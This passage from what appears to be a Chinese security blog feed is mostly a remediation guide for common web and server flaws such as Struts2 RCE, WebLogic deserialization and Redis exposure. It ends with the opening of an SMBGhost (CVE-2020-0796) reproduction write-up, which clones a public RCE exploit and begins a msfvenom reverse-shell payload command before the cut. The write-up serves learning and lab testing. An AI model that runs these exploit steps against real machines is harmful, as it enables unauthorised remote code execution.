文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符../跳出程序本身的限制目录，来下载或显示任意文件。</p><h3 id="修复建议-6"><a href="#修复建议-6" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>对传入的文件名参数进行过滤，并且判断是否是允许获取的文件类型，过滤回溯符../。</code></pre><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h3 id="漏洞描述-6"><a href="#漏洞描述-6" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。</p><h3 id="修复建议-7"><a href="#修复建议-7" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、严格检查变量是否已经初始化。  2、对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符。  3、严格检查文件包含函数中的参数是否外界可控。</code></pre><h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><h3 id="漏洞描述-7"><a href="#漏洞描述-7" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　由于网站用户帐号存在弱口令，导致攻击者通过弱口令可轻松登录到网站中，从而进行下一步的攻击，如上传webshell，获取敏感数据。</p><p>　　另外攻击者利用弱口令登录网站管理后台，可执行任意管理员的操作。</p><h3 id="修复建议-8"><a href="#修复建议-8" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、强制用户首次登录时修改默认口令，或是使用用户自定义初始密码的策略；  2、完善密码策略，信息安全最佳实践的密码策略为8位（包括）以上字符，包含数字、大小写字母、特殊字符中的至少3种。  3、增加人机验证机制，限制ip访问次数。</code></pre><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h3 id="漏洞描述-8"><a href="#漏洞描述-8" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　由于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。</p><h3 id="修复建议-9"><a href="#修复建议-9" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险)  2、如果某个 IP登录次数超过设置的阈值，则锁定IP  3、增加人机验证机制  4、验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。</code></pre><h1 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h1><h3 id="漏洞描述-9"><a href="#漏洞描述-9" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。</p><h3 id="修复建议-10"><a href="#修复建议-10" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、对用户访问角色的权限进行严格的检查及限制。  2、在一些操作时可以使用session对用户的身份进行判断和控制</code></pre><h1 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h1><h3 id="漏洞描述-10"><a href="#漏洞描述-10" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。</p><h3 id="修复建议-11"><a href="#修复建议-11" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、页面进行严格的访问权限的控制以及对访问角色进行权限检查。  2、可以使用session对用户的身份进行判断和控制。</code></pre><h1 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h1><h3 id="漏洞描述-11"><a href="#漏洞描述-11" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　由于web服务器配置不当，开启了目录浏览，攻击者可获得服务器上的文件目录结构，获取敏感文件。</p><h3 id="修复建议-12"><a href="#修复建议-12" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、通过修改配置文件，禁止中间件（如IIS、apache、tomcat）的文件目录索引功能  2、设置目录访问权限</code></pre><h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h3 id="漏洞描述-12"><a href="#漏洞描述-12" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　php反序列化漏洞也叫PHP对象注入，形成原因为程序未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、文件操作、执行数据库操作等不可控后果。这一类攻击在java、python等面向对象语言中均存在。</p><p>可参考：<a href="https://www.freebuf.com/articles/web/167721.html">https://www.freebuf.com/articles/web/167721.html</a></p><h3 id="修复建议-13"><a href="#修复建议-13" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、对传入的对象进行严格的过滤检查  2、在反序列化过程执行的文件读写、命令或代码执行函数中是否有用户可控的参数。</code></pre><h1 id="http-slow拒绝服务攻击"><a href="#http-slow拒绝服务攻击" class="headerlink" title="http slow拒绝服务攻击"></a>http slow拒绝服务攻击</h1><h3 id="漏洞描述-13"><a href="#漏洞描述-13" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　按照设计，HTTP协议要求服务器在处理之前完全接收请求。 如果HTTP请求没有完成，或者传输速率非常低，服务器会保持其资源忙于等待其余数据。如果服务器保持太多的资源请求和处理，这将造成一个拒绝服务。严重者一台主机即可让web运行缓慢甚至是崩溃。</p><h3 id="修复建议-14"><a href="#修复建议-14" class="headerlink" title="修复建议"></a>修复建议</h3><p>  对于 Apache 可以做以下优化（其他服务器原理相同）：</p><pre><code>      1、设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率      2、增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13.Theold name is still supported.      3、默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满Apache的所有连接</code></pre><h1 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h1><h3 id="漏洞描述-14"><a href="#漏洞描述-14" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　CRLF 是“回车 +换行”（\r\n）的简称。在 HTTP 协议中，HTTPHeader 与 HTTP Body 是用两个 CRLF 符号进行分隔的，浏览器根据这两个 CRLF 符号来获取 HTTP 内容并显示。因此，一旦攻击者能够控制 HTTP 消息头中的字符，注入一些恶意的换行，就能注入一些会话 Cookie 或者 HTML 代码。</p><h3 id="修复建议-15"><a href="#修复建议-15" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>1、过滤 \r 、\n 及其各种编码的换行符，避免输入的数据污染到其他 HTTP 消息头。</code></pre><h1 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h1><h3 id="漏洞描述-15"><a href="#漏洞描述-15" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　由于Web 应用程序没有对用户发送的数据进行适当过滤和检查，攻击者可修改LDAP 语句的结构，并且以数据库服务器、Web 服务器等的权限执行任意命令，许可权可能会允许查询、修改或除去 LDAP 树状构造内任何数据。</p><h3 id="修复建议-16"><a href="#修复建议-16" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>对用户的输入内容进行严格的过滤。</code></pre><h1 id="URL-跳转"><a href="#URL-跳转" class="headerlink" title="URL 跳转"></a>URL 跳转</h1><h3 id="漏洞描述-16"><a href="#漏洞描述-16" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。</p><h3 id="修复建议-17"><a href="#修复建议-17" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、在进行页面跳转前校验传入的URL是否为可信域名。  2、白名单规定跳转链接</code></pre><h1 id="明文传输"><a href="#明文传输" class="headerlink" title="明文传输"></a>明文传输</h1><h3 id="漏洞描述-17"><a href="#漏洞描述-17" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　用户登录过程中使用明文传输用户登录信息，若用户遭受中间人攻击时，攻击者可直接获取该用户登录账户，从而进行进一步渗透。</p><h3 id="修复建议-18"><a href="#修复建议-18" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、用户登录信息使用加密传输，如密码在传输前使用安全的算法加密后传输，可采用的算法包括：不可逆hash算法加盐（4位及以上随机数，由服务器端产生）；安全对称加密算法，如AES(128、192、256位)，且必须保证客户端密钥安全，不可被破解或读出；非对称加密算法，如RSA(不低于1024位)、SM2等。  2、使用https来保证传输的安全。</code></pre><h1 id="网页木马"><a href="#网页木马" class="headerlink" title="网页木马"></a>网页木马</h1><h3 id="漏洞描述-18"><a href="#漏洞描述-18" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　经渗透测试发现目标站点存在webshell，攻击者可直接爆破口令使用木马，非常低成本的进行恶意操作。</p><h3 id="修复建议-19"><a href="#修复建议-19" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、确认并删除木马文件，并进行本地文件漏洞扫描排查是否还存在有其他木马。  2、发现并及时修复已存在的漏洞。  3、通过查看日志、服务器杀毒等安全排查，确保服务器未被留下后门</code></pre><h1 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h1><h3 id="漏洞描述-19"><a href="#漏洞描述-19" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　网站备份文件或、敏感信息文件存放在某个网站目录下，攻击者可通过文件扫描等方法发现并下载该备份文件，导致网站敏感信息泄露。</p><h3 id="修复建议-20"><a href="#修复建议-20" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、不在网站目录下存放网站备份文件或敏感信息的文件。  2、如需存放该类文件，请将文件名命名为难以猜解的无规则字符串。</code></pre><h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><h3 id="漏洞描述-20"><a href="#漏洞描述-20" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。</p><h3 id="修复建议-21"><a href="#修复建议-21" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。  2、不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。  3、在服务器端对相关敏感信息进行模糊化处理。  4、对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。</code></pre><h1 id="短信-邮件轰炸"><a href="#短信-邮件轰炸" class="headerlink" title="短信/邮件轰炸"></a>短信/邮件轰炸</h1><h3 id="漏洞描述-21"><a href="#漏洞描述-21" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　由于没有对短信或者邮件发送次数进行限制，导致可无限次发送短信或邮件给用户，从而造成短信轰炸，进而可能被大量用户投诉，从而影响公司声誉。</p><h3 id="修复建议-22"><a href="#修复建议-22" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>在服务器限制发送短信或邮件的频率，如同一账号1分钟只能发送1次短信或邮件，一天只能发送3次。</code></pre><h1 id="phpinfo信息泄漏"><a href="#phpinfo信息泄漏" class="headerlink" title="phpinfo信息泄漏"></a>phpinfo信息泄漏</h1><h3 id="漏洞描述-22"><a href="#漏洞描述-22" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息，造成服务器信息泄露，为攻击提供有利的信息。</p><h3 id="修复建议-23"><a href="#修复建议-23" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、删除phpinfo 函数。  2、若文件无用可直接删除。 </code></pre><h1 id="IIS短文件名泄露漏洞"><a href="#IIS短文件名泄露漏洞" class="headerlink" title="IIS短文件名泄露漏洞"></a>IIS短文件名泄露漏洞</h1><h3 id="漏洞描述-23"><a href="#漏洞描述-23" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。危害：攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。</p><p>　　攻击者可通过该漏洞尝试获取网站服务器文件的文件名，达到获取更多信息来入侵服务器的目的。</p><h3 id="修复建议-24"><a href="#修复建议-24" class="headerlink" title="修复建议"></a>修复建议</h3><p>  修改Windows配置，关闭短文件名功能。</p><pre><code>  1.关闭NTFS 8.3文件格式的支持。该功能默认是开启的，对于大多数用户来说无需开启。  2.如果是虚拟主机空间用户,可采用以下修复方案：      1）修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)。      2）如果你的web环境不需要asp.net的支持你可以进入Internet 信息服务(IIS)管理器 --- Web 服务扩展 - ASP.NET 选择禁止此功能。      3）升级net framework 至4.0以上版本。      3.将web文件夹的内容拷贝到另一个位置，比如D:\www到D:\www.back，然后删除原文件夹D:\www，再重命名D:\www.back到D:\www。如果不重新复制，已经存在的短文件名则是不会消失的。</code></pre><h1 id="应用程序错误信息泄露"><a href="#应用程序错误信息泄露" class="headerlink" title="应用程序错误信息泄露"></a>应用程序错误信息泄露</h1><h3 id="漏洞描述-24"><a href="#漏洞描述-24" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　攻击者可通过特殊的攻击向量，使web服务器出现500、403等相关错误，导致信息泄漏如绝对路径、webserver版本、源代码、sql语句等敏感信息，恶意攻击者很有可能利用这些信息实施进一步的攻击。</p><h3 id="修复建议-25"><a href="#修复建议-25" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>1、自定义错误页面或使用统一的错误页面提示。</code></pre><h1 id="Apache-Tomcat默认文件"><a href="#Apache-Tomcat默认文件" class="headerlink" title="Apache Tomcat默认文件"></a>Apache Tomcat默认文件</h1><h3 id="漏洞描述-25"><a href="#漏洞描述-25" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　Apache Tomcat默认样例文件没有删除或限制访问，可能存在cookie、session伪造，进行后台登录操作</p><h3 id="修复建议-26"><a href="#修复建议-26" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、删除样例文件  2、限制文件访问权限</code></pre><h1 id="Crossdomain-xml-配置不当"><a href="#Crossdomain-xml-配置不当" class="headerlink" title="Crossdomain.xml 配置不当"></a>Crossdomain.xml 配置不当</h1><h3 id="漏洞描述-26"><a href="#漏洞描述-26" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　网站根目录下的 crossdomain.xml 文件指明了远程Flash 是否可以加载当前网站的资源（图片、网页内容、Flash等）。如果配置不当，可能导致遭受跨站请求伪造（CSRF）攻击。</p><h3 id="修复建议-27"><a href="#修复建议-27" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>对于不需要从外部加载资源的网站，在 crossdomain.xml 文件中更改allow-access-from的domain属性为域名白名单。</code></pre><h1 id="目标服务器启用了不安全-HTTP-方法"><a href="#目标服务器启用了不安全-HTTP-方法" class="headerlink" title="目标服务器启用了不安全 HTTP 方法"></a>目标服务器启用了不安全 HTTP 方法</h1><h3 id="漏洞描述-27"><a href="#漏洞描述-27" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　目标服务器启用了不安全的传输方法，如PUT、TRACE、DELETE、MOVE等，这些方法表示可能在服务器上使用了 WebDAV，由于dav方法允许客户端操纵服务器上的文件，如上传、修改、删除相关文件等危险操作，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件。</p><h3 id="修复建议-28"><a href="#修复建议-28" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、关闭不安全的传输方法，只开启POST、GET方法。  2、如果服务器不使用 WebDAV 可直接禁用，或为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码。</code></pre><h1 id="weblogic-SSRF服务器请求伪造"><a href="#weblogic-SSRF服务器请求伪造" class="headerlink" title="weblogic SSRF服务器请求伪造"></a>weblogic SSRF服务器请求伪造</h1><h3 id="漏洞描述-28"><a href="#漏洞描述-28" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　目标存在weblogic SSRF服务器请求伪造漏洞。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。Weblogic中间件默认带有“UDDI 目录浏览器”且为未授权访问，通过该应用，可进行无回显的SSRF请求。攻击者可利用该漏洞对企业内网进行大规模扫描，了解内网结构，并可能结合内网漏洞直接获取服务器权限。</p><h3 id="修复建议-29"><a href="#修复建议-29" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、若不影响业务则可删除uddiexplorer文件夹  2、限制uddiexplorer应用只能内网访问</code></pre><h1 id="Apache-Struts2-远程代码执行漏洞（S2-019）"><a href="#Apache-Struts2-远程代码执行漏洞（S2-019）" class="headerlink" title="Apache Struts2 远程代码执行漏洞（S2-019）"></a>Apache Struts2 远程代码执行漏洞（S2-019）</h1><h3 id="漏洞描述-29"><a href="#漏洞描述-29" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　Apache Struts2的“Dynamic MethodInvocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，如果未关闭此机制将导致远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p><h3 id="修复建议-30"><a href="#修复建议-30" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1、目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载。  2、或者手工设置struts.xml文件&lt;constantname=&quot;struts.enable.DynamicMethodInvocation&quot;value=&quot;false&quot;/&gt;</code></pre><h1 id="Apache-Struts2-远程代码执行漏洞（S2-037）"><a href="#Apache-Struts2-远程代码执行漏洞（S2-037）" class="headerlink" title="Apache Struts2 远程代码执行漏洞（S2-037）"></a>Apache Struts2 远程代码执行漏洞（S2-037）</h1><h3 id="漏洞描述-30"><a href="#漏洞描述-30" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　Apache Struts2在使用REST插件时，攻击者可以绕过动态方法执行的限制，调用恶意表达式执行远程代码。</p><h3 id="修复建议-31"><a href="#修复建议-31" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>建议用户到官方获取最新补丁或者最新版本程序。</code></pre><h1 id="Apache-Struts2-DevMode-远程代码执行漏洞"><a href="#Apache-Struts2-DevMode-远程代码执行漏洞" class="headerlink" title="Apache Struts2 DevMode 远程代码执行漏洞"></a>Apache Struts2 DevMode 远程代码执行漏洞</h1><h3 id="漏洞描述-31"><a href="#漏洞描述-31" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　为了便于开发人员调试程序，Struts2提供了一个devMode模式，可以方便查看程序错误以及日志等信息。当Struts2中的devMode模式设置为true时，存在严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p><h3 id="修复建议-32"><a href="#修复建议-32" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  建议用户到官方获取最新补丁或者最新版本程序。  或者将struts.properties中的devMode设置为false，或是在struts.xml中添加如下代码： &lt;constant name=&quot;struts.devMode&quot;value=&quot;false&quot;/&gt;。</code></pre><h1 id="Apache-Struts2-远程代码执行漏洞（S2-045）"><a href="#Apache-Struts2-远程代码执行漏洞（S2-045）" class="headerlink" title="Apache Struts2 远程代码执行漏洞（S2-045）"></a>Apache Struts2 远程代码执行漏洞（S2-045）</h1><h3 id="漏洞描述-32"><a href="#漏洞描述-32" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　Apache Struts2的Jakarta Multipartparser插件存在远程代码执行漏洞，漏洞编号为CVE-2017-5638。攻击者可以在使用该插件上传文件时，修改HTTP请求头中的Content-Type值来触发该漏洞，导致远程执行代码。</p><h3 id="修复建议-33"><a href="#修复建议-33" class="headerlink" title="修复建议"></a>修复建议</h3><p>　　检测方式查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar ，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。</p><pre><code>  1、建议用户到官方获取最新补丁或者最新版本程序。  2、更新至Strusts2.3.32或者Strusts2.5.10.1，或使用第三方的防护设备进行防护。  3、临时解决方案：删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。  4、修改WEB-INF/classes目录下的配置  在WEB-INF/classes目录下的struts.xml中的struts 标签下添加  &lt;constantname=”struts.custom.i18n.resources”value=”global”/&gt;；  在WEB-INF/classes/目录下添加global.properties，文件内容如下:  struts.messages.upload.error.InvalidContentTypeException=1</code></pre><h1 id="Apache-Struts2-远程代码执行漏洞（S2-033）"><a href="#Apache-Struts2-远程代码执行漏洞（S2-033）" class="headerlink" title="Apache Struts2 远程代码执行漏洞（S2-033）"></a>Apache Struts2 远程代码执行漏洞（S2-033）</h1><h3 id="漏洞描述-33"><a href="#漏洞描述-33" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>　　Apache Struts2在开启动态方法调用（DynamicMethod Invocation）的情况下，攻击者使用REST插件调用恶意表达式可以远程执行代码。</p><h3 id="修复建议-34"><a href="#修复建议-34" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>1、用户到官方获取最新补丁或者最新版本程序。2、或者在允许的情况下禁用动态方法调用（Dynamic Method Invocation），修改Struts2的配置文件struts.xml，将struts.enable.DynamicMethodInvocation设置为“false”。</code></pre><h1 id="redis相关漏洞修复"><a href="#redis相关漏洞修复" class="headerlink" title="redis相关漏洞修复"></a>redis相关漏洞修复</h1><h3 id="漏洞描述-34"><a href="#漏洞描述-34" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>redis默认没有口令可能会造成未授权访问造成信息泄露，若redis为高权限账户运行，可能导致服务器权限丢失等。</p><h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><pre><code>1.禁用一些高危命令常见如：flushdb，flushall，config，keys 等2.以低权限运行 Redis 服务3.为 Redis 添加密码验证4.禁止外网访问 Redis5.保证 authorized_keys 文件的安全</code></pre><h1 id="weblogic反序列化-CVE-2019-2729"><a href="#weblogic反序列化-CVE-2019-2729" class="headerlink" title="weblogic反序列化(CVE-2019-2729)"></a>weblogic反序列化(CVE-2019-2729)</h1><h3 id="漏洞描述-35"><a href="#漏洞描述-35" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>CVE-2019-2729漏洞是由于应用在处理反序列化输入信息时存在缺陷，攻击者可以通过发送精心构造的恶意 HTTP 请求，用于获得目标服务器的权限，并在未授权的情况下执行远程命令，最终获取服务器的权限。与CVE-2019-2725漏洞类似。</p><p>漏洞编号：CVE-2019-2725</p><p>影响版本：10.3.6.0、12.1.3.0、12.2.1.3</p><h3 id="修复建议-35"><a href="#修复建议-35" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  1.目前厂商已经发布了最新升级补丁以修复这些安全问题，强烈建议您尽快安装最新补丁；  2.使用安全组策略屏蔽7001内网入和公网入方向流量。</code></pre><h1 id="VMware-vRealize-SSRF、任意文件上传漏洞"><a href="#VMware-vRealize-SSRF、任意文件上传漏洞" class="headerlink" title="VMware vRealize SSRF、任意文件上传漏洞"></a>VMware vRealize SSRF、任意文件上传漏洞</h1><h3 id="漏洞描述-36"><a href="#漏洞描述-36" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>vRealize Operations Manager API（CVE-2021-21983）中 8.4 之前的任意文<br>件写入漏洞可能允许通过网络访问vRealize Operations Manager API 的经过身份验证的恶意行为者可以将文件写入基础光子操作系统上的任意位置。</p><p>漏洞编号：CVE-2021-21975，CVE-2021-21983</p><p>影响版本：VMware vRealize Operations 7.2-8.6</p><h3 id="修复建议-36"><a href="#修复建议-36" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  vRealize Operations Manager 修复和解决方案  8.3.0  https://kb.vmware.com/s/article/83210   8.2.0  https://kb.vmware.com/s/article/83095   8.1.1  https://kb.vmware.com/s/article/83094   8.0.1  https://kb.vmware.com/s/article/83093   7.5.0  https://kb.vmware.com/s/article/82367   7.0.0  https://kb.vmware.com/s/article/83287</code></pre><h1 id="Win32k-本地权限提升漏洞"><a href="#Win32k-本地权限提升漏洞" class="headerlink" title="Win32k 本地权限提升漏洞"></a>Win32k 本地权限提升漏洞</h1><h3 id="漏洞描述-37"><a href="#漏洞描述-37" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>该漏洞官方命名为 Win32k 本地权限提升漏洞，实际上漏洞出自 dwmcore.dll<br>该漏洞是由于数组索引越界导致的任意地址写漏洞,攻击者可利用该漏洞在<br>获得权限的情况下，构造恶意数据执行本地权限提升攻击，最终获取服务器最高权限。</p><p>漏洞编号：CVE-2021-28310</p><p>影响版本：</p><p>Windows 10 Version 1803, 1809, 1909, 2004, 20H2</p><p>Windows Server 2019</p><p>Windows Server version 1909, 2004, 20H2</p><h3 id="修复建议-37"><a href="#修复建议-37" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>  当前官方已发布受影响版本的对应补丁，建议受影响的用户及时更新官方的安全补丁。链接如下：https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28310</code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞修复 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 漏洞修复 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-0796“永恒之黑”漏洞复现</title>
      <link href="post/cve-2020-0796.html"/>
      <url>post/cve-2020-0796.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h2><p>Microsoft Server Message Block 3.1.1(SMBv3)协议在处理某些请求的方式中存在代码执行漏洞。攻击者可以精心构造数据包发送到SMB服务器，无需经过身份验证，即可在目标服务器上执行任意代码。攻击者可通过部署一台恶意SMB v3服务器，并诱导用户（客户端）连接到该服务器，一旦目标用户连接，即可在计算机上执行攻击者自定义的恶意代码。由于上述漏洞与WannaCry（2017年5月“永恒之蓝”）漏洞较为相似，易被蠕虫利用传播恶意程序，可能会成为恶意软件和攻击者广泛利用的漏洞</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h2><ul><li>Windows 10 Version 1903 for 32-bit Systems</li><li>Windows 10 Version 1903 for ARM64-based Systems</li><li>Windows 10 Version 1903 for x64-based Systems</li><li>Windows 10 Version 1909 for 32-bit Systems</li><li>Windows 10 Version 1909 for ARM64-based Systems</li><li>Windows 10 Version 1909 for x64-based Systems</li><li>Windows Server, version 1903 (Server Core installation)</li><li>Windows Server, version 1909 (Server Core installation)</li></ul><h2 id="0x02-测试环境"><a href="#0x02-测试环境" class="headerlink" title="0x02 测试环境"></a>0x02 测试环境</h2><p>靶机：cn_windows_10_consumer_editions_version_1903_x64(关闭防火墙)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1uPXjfAYUUaJvZQLNylwBNg  提取码：wkrq</span><br></pre></td></tr></table></figure><p>攻击机：kali 2020.3</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>打开靶机，关闭靶机防火墙<br><img src="/image/image-20201113145930089.png" alt="1"></p><p>打开kali,通过git 命令下载检测漏洞的python脚本<br><img src="/image/image-20201113152431290.png" alt="1"></p><p>利用脚本测试主机是否存在漏洞<br><img src="/image/image-20201113163204329.png" alt="1"><br>如上图显示证明存在漏洞</p><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>下载漏洞利用脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;chompie1337&#x2F;SMBGhost_RCE_PoC.git</span><br></pre></td></tr></table></figure><p><img src="/image/image-20201113153428205.png" alt="1"></p><p>exploit.py原文件不能直接用来攻击，需要修改其中的USER_PAYLOAD部分</p><p>利用msfvenom生成payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 # lhost为kali的IP，lport为监听端口</span><br><span class="line">2 msfvenom -p 